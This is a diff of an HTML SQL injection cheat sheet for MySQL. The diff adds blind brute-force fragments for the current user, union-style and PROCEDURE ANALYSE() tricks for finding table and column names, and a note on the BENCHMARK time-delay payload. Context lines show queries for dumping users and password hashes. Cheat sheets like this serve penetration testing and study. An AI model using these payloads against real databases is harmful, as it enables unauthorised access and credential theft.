@@ -18,7 +18,9 @@ Comments &#09;&#09;&#09;SELECT 1; #comment<ul><li style="list-style-type: none">
 </ul>
 </li>
 </ul>
-Current User &#09;&#09;&#09;SELECT user();<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;SELECT system_user();</li>
+Current User &#09;&#09;&#09;SELECT user();<br/>
+&nbsp;&#09;&#09;&#09;&#09;&#09;AND user() LIKE 'root<br/>
+&nbsp;&#09;&#09;&#09;&#09;&#09;AND MID((user()),1,1)&gt;'m #etc etc brute<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;SELECT system_user();</li>
 </ul>
 </li>
 </ul>
@@ -27,6 +29,7 @@ Current User &#09;&#09;&#09;SELECT user();<ul><li style="list-style-type: none">
 </li>
 </ul>
 </li>
+<li style="list-style-type: none">&nbsp;&#09;&#09;&#09;&#09;SELECT current_user,null</li>
 </ul>
 List Users* &#09;&#09;&#09;SELECT user FROM mysql.user; — priv<br/>
 List Password Hashes* &#09;SELECT host, user, password FROM mysql.user; — priv<br/>
@@ -81,6 +84,8 @@ List Tables &#09;&#09;&#09;SELECT table_schema,table_name FROM information_schem
 </li>
 </ul>
 </li>
+</ul>
+List Table/Column Names&#09;PROCEDURE ANALYSE() #<a href="https://websec.wordpress.com/2009/01/26/mysql-table-and-column-names-update/">Source</a>, should get the current table and column names<ul><li style="list-style-type: none">&nbsp;&#09;&#09;&#09;&#09;LIMIT (1 . . n),1 PROCEDURE ANALYSE() #Using LIMIT to get additional column names</li>
 </ul>
 Find Tables From <br/>
 Column Name &#09;&#09;&#09;SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’; — find table <ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;which have a column called ‘username’</li>
@@ -139,7 +144,7 @@ String Concatenation &#09;SELECT CONCAT(‘A’,'B’); #returns AB<ul><li style
 If Statement &#09;&#09;&#09;SELECT if(1=1,’foo’,'bar’); — returns ‘foo’<br/>
 Case Statement &#09;&#09;SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END; # returns A<br/>
 Avoiding Quotes &#09;&#09;SELECT 0×414243; # returns ABC<br/>
-Time Delay &#09;&#09;&#09;SELECT BENCHMARK(1000000,MD5(‘A’));<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;SELECT SLEEP(5); # &gt;= 5.0.12</li>
+Time Delay &#09;&#09;&#09;SELECT BENCHMARK(1000000,MD5(‘A’)); #BENCHMARK(howmanytimes, do this)<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&nbsp; &nbsp;SELECT SLEEP(5); # &gt;= 5.0.12</li>
 </ul>
 </li>
 </ul>
@@ -177,14 +182,6 @@ Databases &#09;&#09;&#09;information_schema (&gt;= mysql 5.0)<ul><li style="list
 </ul>
 </li>
 </ul>
-Potentially Useful <br/>
-MySQL Functions&#09;&#09;MD5() MD5 Hashing<br/>
-&nbsp;&#09;&#09;&#09;&#09;&#09;SHA1() SHA1 Hashing<br/>
-&nbsp;&#09;&#09;&#09;&#09;&#09;PASSWORD()<br/>
-&nbsp;&#09;&#09;&#09;&#09;&#09;ENCODE()<br/>
-&nbsp;&#09;&#09;&#09;&#09;&#09;COMPRESS() Compress data, can be great in large binary reading in Blind SQL Injections.<br/>
-&nbsp;&#09;&#09;&#09;&#09;&#09;ROW_COUNT()<ul><li style="list-style-type: none">&nbsp;&#09;&#09;&#09;&#09;SCHEMA()</li>
-</ul>
-&nbsp;&#09;&#09;&#09;&#09;&#09;VERSION() Same as @@version<br/>
+<br/>
 <br/>
 </body></html>
